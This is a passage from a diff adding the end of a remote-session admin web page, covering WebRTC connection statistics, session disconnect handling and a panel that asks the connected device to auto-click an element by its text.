+      }
+      ssPrev = cur;
+    } else if (pc) {
+      try {
+        const stats = await pc.getStats();
+        let inbound;
+        stats.forEach(s => { if (s.type === 'inbound-rtp' && s.kind === 'video') inbound = s; });
+        if (inbound) {
+          let kbps = 0;
+          if (lastTs) kbps = Math.round((inbound.bytesReceived - lastBytes) * 8 / (inbound.timestamp - lastTs));
+          lastBytes = inbound.bytesReceived; lastTs = inbound.timestamp;
+          text += `ice:     ${pc.iceConnectionState}\n`;
+          text += `video:   ${inbound.frameWidth}x${inbound.frameHeight} @${inbound.framesPerSecond} fps\n`;
+          text += `bitrate: ${kbps} kbps\n`;
+        }
+      } catch(_) {}
+    }
+    text += `ctrl:    ${ctrlRtt == null ? '?' : ctrlRtt} ms`;
+    document.getElementById('stats').textContent = text;
+  }, 1000);
+}
+function stopStats() {
+  if (statsTimer) { clearInterval(statsTimer); statsTimer = null; }
+  lastBytes = 0; lastTs = 0; ssPrev = null;
+}
+
+// Disconnect
+function disconnect(reason) {
+  if (snapshotMode) exitSnapshot();
+  if (statsTimer) { clearInterval(statsTimer); statsTimer = null; }
+  try { pc?.close(); } catch(_) {}
+  try { ws?.close(); } catch(_) {}
+  pc = null; ws = null;
+  isConnected = false;
+  document.getElementById('conn').classList.remove('hidden');
+  document.getElementById('conn-status').textContent = reason || 'Disconnected';
+  document.getElementById('conn-sub').textContent = 'You can close this tab';
+  document.getElementById('conn-cancel').textContent = 'Back to Admin';
+  document.getElementById('conn-cancel').onclick = () => window.close();
+  beep(440, 0.1); setTimeout(() => beep(330, 0.12), 90);
+}
+document.getElementById('hd-close').addEventListener('click', () => disconnect('Session ended'));
+document.getElementById('conn-cancel').addEventListener('click', () => {
+  if (isConnected) disconnect('Cancelled');
+  else window.close();
+});
+document.getElementById('hd-back').addEventListener('click', () => {
+  if (isConnected && !confirm('Close this remote session?')) return;
+  if (isConnected) disconnect('Closing');
+  setTimeout(() => window.close(), 200);
+});
+
+// ═══════════════════════════════════════════════════════════════════════
+//  BOOT
+// ═══════════════════════════════════════════════════════════════════════
+// ═══════════════════════════════════════════════════════════════════════
+//  UNIVERSAL AUTO-CLICK PANEL
+// ═══════════════════════════════════════════════════════════════════════
+function showAutoClickResult(success, message, suggestions) {
+  const el = document.getElementById('ac-result');
+  let text = (success ? '✅ ' : '❌ ') + message;
+  if (suggestions && suggestions.length > 0) {
+    text += '\n\nAvailable clickable texts:\n';
+    for (const s of suggestions) text += '  • ' + s + '\n';
+    text = text.trimEnd();
+  }
+  el.textContent = text;
+  el.classList.toggle('success', !!success);
+  el.classList.toggle('fail', !success);
+}
+
+document.getElementById('tb-auto-click').addEventListener('click', () => {
+  if (!isConnected) { return; }
+  openPanel('panel-auto-click');
+  const input = document.getElementById('ac-input');
+  setTimeout(() => input.focus(), 250);
+});
+
+document.getElementById('ac-cancel').addEventListener('click', () => {
+  closeAllPanels();
+});
+
+document.getElementById('ac-send').addEventListener('click', () => {
+  const query = (document.getElementById('ac-input').value || '').trim();
+  if (!query) return;
+  showAutoClickResult(true, 'Searching for "' + query + '"…', []);
+  sendMsg({ type: 'auto_click', query });
+});
+
+document.getElementById('ac-input').addEventListener('keydown', (e) => {
+  if (e.key === 'Enter') document.getElementById('ac-send').click();
+});
+
+function handleAutoClickResult(data) {
+  showAutoClickResult(!!data.success, data.message || '', data.suggestions || []);
+}
+
+if (DEVICE_ID) {
+  setTimeout(connect, 200);
+}
+</script>
+</body>
+</html>
